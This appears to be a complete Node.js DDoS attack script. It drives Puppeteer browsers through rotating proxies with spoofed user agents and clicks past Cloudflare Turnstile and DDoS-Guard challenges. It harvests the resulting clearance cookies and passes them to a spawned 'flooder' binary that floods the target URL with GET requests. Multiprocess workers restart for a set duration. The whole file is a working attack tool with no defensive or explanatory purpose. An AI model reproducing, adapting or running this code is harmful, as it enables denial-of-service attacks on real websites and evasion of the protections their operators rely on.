const puppeteer = require('puppeteer');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

var [target, time, threads, requests, proxyfile, winlin, debug] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
const scriptContent = fs.readFileSync('script.js', 'utf8');

process.on("uncaughtException", function (error) { console.log(error) });
process.on("unhandledRejection", function (error) { console.log(error) });
process.setMaxListeners(0);

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    console.log(`(${hours}:${minutes}:${seconds}) - ${string}`);
}

let lol = 0;

target = target + getRandomChar();

async function main(proxy) {
    let browser;
    try {
        lol = lol + 1;
        log(`[BROWSER #${lol}] New session started`);
        const randomVersion = Math.floor(Math.random() * 3) + 119;
        var dodopizza = '';
        if (winlin == "Windows") {
            dodopizza = "Windows NT 10.0; Win64; x64";
        } else {
            dodopizza = "X11; Linux x86_64";
        }
        const userAgent = `Mozilla/5.0 (${dodopizza}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`;
        const port = 1000 + Math.floor(Math.random() * 59000);
        browser = await puppeteer.launch({
            headless: false,
            args: [
                '--incognito',
                '--start-maximized',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process',
                '--use-fake-device-for-media-stream',
                '--use-fake-ui-for-media-stream',
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-software-rasterizer',
                '--enable-features=NetworkService',
                '--proxy-server=' + proxy,
                '--user-agent=' + userAgent,
                '--auto-open-devtools-for-tabs',
                `--remote-debugging-port=${port}`,
                '--num=1',
                '--disable-threaded-animation',
                '--no-process-per-site',
                '--in-process-gpu',
                '--use-gl=swiftshader',
                '--disable-gpu',
            ],
            ignoreDefaultArgs: ['--enable-automation'],
            defaultViewport: null,
        });

        if (!browser) {
            error('Browser is not initialized. Call initBrowser() first.');
            return null;
        }

        await new Promise(resolve => setTimeout(resolve, 100));
        const blankPage = await browser.newPage();

        const deviceMemories = [2, 4, 8]
        const hardwareConcurrency = deviceMemories[~~(Math.random() * deviceMemories.length)]
        const deviceMemory = deviceMemories[~~(Math.random() * deviceMemories.length)]

        const expression = `(() => {
            ${scriptContent}; abc(${hardwareConcurrency}, ${deviceMemory}, ${Math.random()})
          })()`;

        await new Promise(resolve => setTimeout(resolve, 100));
        await blankPage.evaluate(expression);
        await blankPage.goto('about:blank');
        await blankPage.goto(target);

        await blankPage.evaluate((target) => {
            window.open(target, '_blank');
        }, target);

        await new Promise(resolve => setTimeout(resolve, 5000));

        const pages = await browser.pages();
        const newPage = pages[pages.length - 1];

        const seks = await newPage.title();
        log(`[BROWSER #${lol}] Title: ${seks} | Usergent: ${userAgent}`);

        if (!newPage) {
            error('New page not found');
            return null;
        }

        await new Promise(resolve => setTimeout(resolve, 5000));
        await turnstile(newPage);
        await new Promise(resolve => setTimeout(resolve, 5000));

        const checked_title = await newPage.title();
        if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Interactive Challenge", "Interactive"].includes(checked_title)) {
            await browser.close();
        }   
        
        const title = await newPage.title();
        if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Interactive Challenge", "Interactive"].includes(title)) {
            await browser.close();
        } else {
            log(`[BROWSER #${lol}] Protection not found ~ [Default Site]`);
        }

        if (["ddos-guard", "DDOS-GUARD", "DDoS-Guard"].includes(title)) {
            log(`[BROWSER #${lol}] Detected protection ~ DDoS-Guard (JavaScript Challenge)`);
            requests = 1;
        }

        const cookie = await newPage.cookies();
        const cookieString = cookie.map((c) => `${c.name}=${c.value}`).join("; ");
        log(`[BROWSER #${lol}] TITLE: ${title} COOKIE: ${cookieString}`);
        gogoebashit(cookieString, userAgent, proxy);
        await browser.close();
    } catch(err) {
        if(debug == true || debug == "true") {
            console.log(err);
        }
    } finally {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        main(proxy);
        browser.close();
    }
}

async function turnstile(page) {
    const iframeElement = await page.$('iframe[allow="cross-origin-isolated; fullscreen"]');

    if (!iframeElement) {
        return;
    }

    const iframeBox = await iframeElement.boundingBox();

    if (!iframeBox) {
        return;
    }

    log(`[BROWSER #${lol}] Detected protection ~ Cloudflare JS (Turnstile Captcha)`);

    const x = iframeBox.x + (iframeBox.width / 2);
    const y = iframeBox.y + (iframeBox.height / 2);

    log(`[BROWSER #${lol}] Clicked ~ ${x} ${y}`)

    await page.mouse.move(x, y);
    await new Promise(resolve => setTimeout(resolve, 111));
    await page.mouse.down();
    await new Promise(resolve => setTimeout(resolve, 222));
    await page.mouse.up();
    await new Promise(resolve => setTimeout(resolve, 100));
    await page.click(`body`, { x, y });
}

function gogoebashit(cookieString, userAgent, proxy) {
    var args;
    if (debug == true || debug == "true") {
        args = [
            "GET",
            target,
            "10",
            requests,
            "--debug",
            "--browserp", `${proxy}`,
            "--browseru", `${userAgent}`,
            "--cookie", `${cookieString}`,
        ]
    } else {
        args = [
            "GET",
            target,
            time,
            requests,
            "--browserp", `${proxy}`,
            "--browseru", `${userAgent}`,
            "--cookie", `${cookieString}`
        ]
    }
    const xyeta = spawn('./flooder', args, {
        stdio: 'pipe'
    })

    xyeta.stdout.on('data', (data) => {
        console.log(`${data}`);
    });

}


function start() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    main(proxy);
}

if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(log('Primary process exiting...')), time * 1000);

} else {
    start();
    setTimeout(() => process.exit(log(`Worker ${process.pid} exiting...`)), time * 1000);
}